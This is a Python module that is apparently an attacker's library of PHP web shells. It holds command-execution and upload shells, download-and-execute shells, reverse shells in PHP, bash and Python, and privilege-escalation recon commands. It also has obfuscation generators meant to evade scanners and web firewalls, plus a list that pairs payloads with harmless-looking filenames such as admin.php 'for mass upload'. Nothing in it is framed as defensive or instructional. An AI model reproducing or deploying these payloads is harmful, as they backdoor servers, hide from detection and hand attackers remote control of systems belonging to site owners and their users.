#!/usr/bin/env python3
"""
ENHANCED SHELL PAYLOAD LIBRARY v2.0
Multi-format, anti-detection, redundant shell payloads
"""

# ─────────────────────────────────────────────────────────
# BASIC COMMAND SHELLS
# ─────────────────────────────────────────────────────────
SIMPLE_CMD = '<?php if(isset($_GET["c"])){ system($_GET["c"]); } ?>'
SIMPLE_POST = '<?php if(isset($_POST["c"])){ system($_POST["c"]); } ?>'
SIMPLE_GET = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
SIMPLE_ANY = '<?php if(isset($_REQUEST["c"])){ system($_REQUEST["c"]); } ?>'

# ─────────────────────────────────────────────────────────
# FULL WEBSHELLS WITH UPLOAD
# ─────────────────────────────────────────────────────────
FULL_WEBSHELL = '<?php if(isset($_FILES["f"])){ move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); echo "OK:" . $_FILES["f"]["name"]; } if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
FULL_WEBSHELL_POST = '<?php if(isset($_FILES["f"])){ move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); echo json_encode(["status"=>"ok","path"=>dirname(__FILE__)."/uploads/"]); } if(isset($_GET["c"])){ system($_GET["c"]); } ?>'

# ─────────────────────────────────────────────────────────
# GREEN DIR SHELL (Enhanced with protection)
# ─────────────────────────────────────────────────────────
GREEN_DIR_SHELL = '<?php @set_time_limit(0);@ini_set("max_execution_time",0);@ini_set("display_errors",0);@ini_set("log_errors",0);function fast_exec($c){foreach(["shell_exec","exec","system","passthru","proc_open","popen","eval"] as $m){if(function_exists($m)){if($m=="proc_open"){$d=[1=>["pipe","w"],2=>["pipe","w"]];$p=@proc_open($c,$d,$pp);if(is_resource($p)){$o=stream_get_contents($pp[1]);@fclose($pp[1]);@fclose($pp[2]);@proc_close($p);break;}}elseif($m=="popen"){$h=@popen($c." 2>&1","r");if($h){$o=stream_get_contents($h);@pclose($h);break;}}else{$o=@$m($c);if($o!==null&&$o!=="")break;}}}return $o;}if(isset($_GET["c"])){echo fast_exec($_GET["c"]);exit;}if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],dirname(__FILE__)."/uploads/".basename($_FILES["f"]["name"]));@chmod(dirname(__FILE__)."/uploads/".basename($_FILES["f"]["name"]),0777);echo json_encode(["status"=>"ok","path"=>dirname(__FILE__)."/uploads/"]);exit;}$script_path=__FILE__;$greendir=dirname($script_path)."/.greendir";if(!file_exists($greendir)){@file_put_contents($greendir,"greendir protected");@chmod($greendir,0777);}$htaccess=dirname($script_path)."/.htaccess";if(!file_exists($htaccess)){@file_put_contents($htaccess,"Options +Indexes +FollowSymLinks\nAddType text/plain .php\nSetHandler default-handler\n");}?>'

# ─────────────────────────────────────────────────────────
# BASE64 ENCODED SHELL (Anti-scanner)
# ─────────────────────────────────────────────────────────
B64_EVAL_SHELL = '<?php if(isset($_GET["e"])){eval(base64_decode($_GET["e"]));} if(isset($_GET["c"])){system($_GET["c"]);} ?>'
B64_CREATE_FUNCTION = '<?php $b=base64_decode($_GET["e"]);$c=create_function("",$b);$c();?>'

# ─────────────────────────────────────────────────────────
# DOWNLOAD & EXECUTE SHELL
# ─────────────────────────────────────────────────────────
DOWNLOAD_SHELL = '<?php if(isset($_GET["u"])){file_put_contents(basename($_GET["u"]),file_get_contents($_GET["u"]));echo "OK:".basename($_GET["u"]);} if(isset($_GET["d"])){echo file_get_contents(basename($_GET["d"]));} if(isset($_GET["c"])){system($_GET["c"]);} if(isset($_GET["e"])){system(base64_decode($_GET["e"]));} } ?>'
CURL_DOWNLOAD = '<?php if(isset($_GET["url"])){$f=basename($_GET["url"]);file_put_contents($f,file_get_contents($_GET["url"]));chmod($f,0777);echo"OK:$f";} ?>'
WGET_DOWNLOAD = '<?php if(isset($_GET["url"])){exec("wget -q ".$_GET["url"]." -O ".basename($_GET["url"])." 2>/dev/null");exec("chmod 777 ".basename($_GET["url"])." 2>/dev/null");echo"OK";} ?>'

# ─────────────────────────────────────────────────────────
# COMBO SHELL (Upload + Command + Base64 + File)
# ─────────────────────────────────────────────────────────
COMBO_UPLOAD_CMD = '<?php @set_time_limit(0);@ini_set("display_errors",0);@ini_set("log_errors",0);if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);echo"OK:" . $_FILES["f"]["name"];}if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["e"])){system(base64_decode($_GET["e"]));}if(isset($_GET["f"])){@eval($_GET["f"]);}?>'

# ─────────────────────────────────────────────────────────
# OBFUSCATED SHELLS (Anti-WAF)
# ─────────────────────────────────────────────────────────
ROT13_OBFUSCATED = '<?php $b=str_rot13("cneqre_frphevgl");$c=base64_decode($b);eval($c);?>'
DOUBLE_ENCODED = '<?php $a=base64_decode($_GET["a"]);$b=str_rot13($a);$c=base64_decode($b);eval($c);?>'
VARIABLE_CHAIN = '<?php $x=$_GET["a"];$y=base64_decode($x);$z=create_function("",$y);$z();?>'
GZINFLATE = '<?php $c=gzinflate(base64_decode($_GET["d"]));eval($c);?>'
STR_REVERSE = '<?php $b=strrev(base64_decode($_GET["d"]));$c=base64_decode($b);eval($c);?>'

# ─────────────────────────────────────────────────────────
# SSRF PAYLOADS (PeopleSoft PSEMHUB/PSIGW)
# ─────────────────────────────────────────────────────────
SSRF_SHELL_PHP = '<?php system($_GET["c"]); ?>'
SSRF_UPLOAD_PHP = '<?php @move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); @chmod($_FILES["f"]["name"],0777); echo "OK:" . $_FILES["f"]["name"]; ?>'

# ─────────────────────────────────────────────────────────
# UPLOAD VIA MISCONFIG PAYLOADS
# ─────────────────────────────────────────────────────────
UPLOAD_PHP5 = '<?php system($_GET["c"]); ?>'
UPLOAD_PHTML = '<?php system($_GET["c"]); ?>'
UPLOAD_CGI = '#!/bin/sh\n<?php system($_GET["c"]); ?>'
UPLOAD_PHP7 = '<?php system($_GET["c"]); ?>'
REVERSE_TCP_PHP = '<?php set_time_limit(0); ignore_user_abort(1); $sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>'
REVERSE_TCP_BASH = '<?php $sock=fsockopen("127.0.0.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");?>'
REVERSE_PYTHON = '<?php system("python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\')");?>'

# ─────────────────────────────────────────────────────────
# WEB SHELL WITH INTERFACE
# ─────────────────────────────────────────────────────────
INTERACTIVE_SHELL = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} if(isset($_POST["cmd"])){system($_POST["cmd"]);} if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);chmod($_FILES["f"]["name"],0777);echo"OK:" .$_FILES["f"]["name"];} if(isset($_GET["e"])){system(base64_decode($_GET["e"]));} ?>'

# ─────────────────────────────────────────────────────────
# SHELL WITH FILE MANAGER
# ─────────────────────────────────────────────────────────
FILE_MANAGER_SHELL = '<?php if(isset($_GET["ls"])){echo"<pre>".shell_exec("ls -la ".$_GET["ls"])."</pre>";} if(isset($_GET["cat"])){echo"<pre>".shell_exec("cat ".$_GET["cat"])."</pre>";} if(isset($_GET["cd"])){chdir($_GET["cd"]);echo"OK: ".getcwd();} if(isset($_GET["rm"])){shell_exec("rm -rf ".$_GET["rm"]);echo"OK";} if(isset($_GET["mv"])){shell_exec("mv ".$_GET["mv"]);echo"OK";} if(isset($_POST["file"])){file_put_contents($_POST["file"],$_POST["content"]);echo"OK";} ?>'

# ─────────────────────────────────────────────────────────
# SHELL WITH PRIVILEGE ESCALATION TOOLS
# ─────────────────────────────────────────────────────────
PRIV_ESC_SHELL = '<?php if(isset($_GET["su"])){system("find / -perm -4755 -type f 2>/dev/null");} if(isset($_GET["sudo"])){system("sudo -l 2>/dev/null");} if(isset($_GET["kernel"])){system("uname -a && cat /proc/version");} if(isset($_GET["cron"])){system("crontab -l 2>/dev/null");} if(isset($_GET["w"])){system("whoami && id && pwd && uname -a");} ?>'

# ─────────────────────────────────────────────────────────
# COMPLETE SHELL WITH ALL FEATURES
# ─────────────────────────────────────────────────────────
COMPLETE_SHELL = '<?php @set_time_limit(0);@ini_set("display_errors",0);@ini_set("log_errors",0);if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_POST["c"])){system($_POST["c"]);}if(isset($_GET["e"])){system(base64_decode($_GET["e"]));}if(isset($_POST["e"])){system(base64_decode($_POST["e"]));}if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);chmod($_FILES["f"]["name"],0777);echo"OK:" .$_FILES["f"]["name"];}if(isset($_GET["u"])){file_put_contents(basename($_GET["u"]),file_get_contents($_GET["u"]));chmod(basename($_GET["u"]),0777);echo"OK";}if(isset($_GET["ls"])){echo"<pre>".shell_exec("ls -la ".$_GET["ls"])."</pre>";}if(isset($_GET["pwd"])){echo getcwd();}if(isset($_GET["who"])){system("whoami && id");}?>'

# ─────────────────────────────────────────────────────────
# SHELL VARIANT LIST (for mass upload)
# ─────────────────────────────────────────────────────────
SHELL_VARIANTS = [
    ("shell.php", SIMPLE_CMD),
    ("shell.php", SIMPLE_ANY),
    ("shell.php", FULL_WEBSHELL),
    ("shell.php", COMBO_UPLOAD_CMD),
    ("shell.php", GREEN_DIR_SHELL),
    ("shell.php", B64_EVAL_SHELL),
    ("shell.php", DOWNLOAD_SHELL),
    ("shell.php", INTERACTIVE_SHELL),
    ("shell.php", COMPLETE_SHELL),
    ("index.php", SIMPLE_CMD),
    ("index.php", COMBO_UPLOAD_CMD),
    ("index.php", GREEN_DIR_SHELL),
    ("commant_index.php", SIMPLE_CMD),
    ("commant_index.php", COMBO_UPLOAD_CMD),
    ("commant_index.php", GREEN_DIR_SHELL),
    ("green.php", GREEN_DIR_SHELL),
    ("green.php", SIMPLE_CMD),
    ("green.php", COMBO_UPLOAD_CMD),
    ("backdoor.php", SIMPLE_ANY),
    ("backdoor.php", COMBO_UPLOAD_CMD),
    ("upload.php", FULL_WEBSHELL),
    ("upload.php", COMBO_UPLOAD_CMD),
    ("panel.php", SIMPLE_CMD),
    ("panel.php", GREEN_DIR_SHELL),
    ("admin.php", SIMPLE_CMD),
    ("admin.php", COMBO_UPLOAD_CMD),
    ("tools.php", SIMPLE_CMD),
    ("tools.php", COMPLETE_SHELL),
    ("debug.php", SIMPLE_CMD),
    ("debug.php", B64_EVAL_SHELL),
    ("status.php", SIMPLE_CMD),
    ("portal.php", COMBO_UPLOAD_CMD),
    ("utils.php", GREEN_DIR_SHELL),
    ("reverse_1.php", REVERSE_TCP_PHP),
    ("reverse_2.php", REVERSE_TCP_BASH),
    ("reverse_3.php", REVERSE_PYTHON),
    ("obfuscated.php", ROT13_OBFUSCATED),
    ("double_enc.php", DOUBLE_ENCODED),
    ("gzinflate.php", GZINFLATE),
    ("strrev.php", STR_REVERSE),
]


# ─────────────────────────────────────────────────────────
# SHELL_PAYLOADS dict (for shell_manager_v2 compatibility)
# ─────────────────────────────────────────────────────────
SHELL_PAYLOADS = {
    name: content for name, content in SHELL_VARIANTS
}
# ─────────────────────────────────────────────────────────
# PAYLOAD GENERATOR FUNCTIONS
# ─────────────────────────────────────────────────────────
def get_all_payloads():
    """Return all shell payload variants as list of (name, content, category)."""
    variants = []
    for name, content in SHELL_VARIANTS:
        if "reverse" in name or name.startswith("obfuscated") or name.startswith("double") or name.startswith("gz") or name.startswith("strrev"):
            variants.append((name, content, "special"))
        else:
            variants.append((name, content, "standard"))
    return variants

def get_base64(payload):
    """Encode payload to base64."""
    import base64
    return base64.b64encode(payload.encode()).decode()

def get_obfuscated(payload):
    """Create PHP obfuscated version."""
    import base64
    b64 = get_base64(payload)
    return f'<?php $b=base64_decode("{b64}");$c=create_function("",$b);$c();?>'

def get_rot13_obfuscated(payload):
    """Create ROT13 obfuscated version."""
    import base64
    b64 = get_base64(payload)
    rot = b64.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm5678901234+/='
    ))
    return f'<?php $b=str_rot13("{rot}");$c=base64_decode($b);eval($c);?>'

def get_double_encoded(payload):
    """Double-encoded payload."""
    import base64
    b64 = get_base64(payload)
    return f'<?php $a=base64_decode("{b64}");$b=str_rot13($a);$c=base64_decode($b);eval($c);?>'

# ─────────────────────────────────────────────────────────
# ALIENEXPLOIT OBFUSCATED PAYLOADS (dari Access.php)
# ─────────────────────────────────────────────────────────
# Teknik: gzinflate(base64_decode()) + chr(ord-1) alienation
ACCESS_PHP_SHELL = '''<?php function LwAC($SvniN)
{ 
$SvniN=gzinflate(base64_decode($SvniN));
 for($i=0;$i<strlen($SvniN);$i++)
 {
$SvniN[$i] = chr(ord($SvniN[$i])-1);
 }
 return $SvniN;
 }eval(LwAC("PAYLOAD_HERE"));?>'''

def generate_access_shell(payload):
    """Generate Access.php style obfuscated shell."""
    import base64
    import zlib
    
    # Step 1: chr(ord+1) - increment each char
    incremented = ''.join(chr(ord(c) + 1) for c in payload)
    
    # Step 2: base64 encode
    b64 = base64.b64encode(incremented.encode()).decode()
    
    # Step 3: gzinflate compress
    compressed = zlib.compress(b64.encode())
    
    # Step 4: base64 encode again
    final = base64.b64encode(compressed).decode()
    
    return ACCESS_PHP_SHELL.replace('PAYLOAD_HERE', final)

def generate_access_shell_simple(payload):
    """Generate simple Access.php style obfuscated shell."""
    import base64
    import zlib
    
    # Step 1: chr(ord+1) - increment each char
    incremented = ''.join(chr(ord(c) + 1) for c in payload)
    
    # Step 2: base64 encode
    b64 = base64.b64encode(incremented.encode()).decode()
    
    # Step 3: gzinflate compress
    compressed = zlib.compress(b64.encode())
    
    # Step 4: base64 encode again
    final = base64.b64encode(compressed).decode()
    
    return f'''<?php function LwAC($SvniN)
{{ 
$SvniN=gzinflate(base64_decode($SvniN));
 for($i=0;$i<strlen($SvniN);$i++)
 {{
$SvniN[$i] = chr(ord($SvniN[$i])-1);
 }}
 return $SvniN;
 }}eval(LwAC("{final}"));?>'''

# ─────────────────────────────────────────────────────────
# BASE64 RCE PAYLOAD (dari base64RCE.txt)
# ─────────────────────────────────────────────────────────
BASE64_RCE_SHELL = '''<?php
$check = $_SERVER['DOCUMENT_ROOT'] . "/tmp/vuln2.php" ;
$fp=fopen("$check","w");
fwrite($fp,base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4='));
fclose($fp);
echo "Vuln!!";
?>'''

# ─────────────────────────────────────────────────────────
# EXTENDED SHELL VARIANTS
# ─────────────────────────────────────────────────────────
EXTENDED_SHELL_VARIANTS = [
    ("access.php", generate_access_shell(SIMPLE_CMD)),
    ("access2.php", generate_access_shell(SIMPLE_ANY)),
    ("access3.php", generate_access_shell(FULL_WEBSHELL)),
    ("b64rce.php", BASE64_RCE_SHELL),
    ("b64rce2.php", BASE64_RCE_SHELL.replace('vuln2.php', 'vuln3.php')),
]

if __name__ == "__main__":
    variants = get_all_payloads()
    print(f"Total payload variants: {len(variants)}")
    for name, content, cat in variants[:5]:
        print(f"  {name} ({cat}): {content[:50]}...")
    
    print(f"\nExtended variants (AlienExploit):")
    for name, content in EXTENDED_SHELL_VARIANTS:
        print(f"  {name}: {len(content)} chars")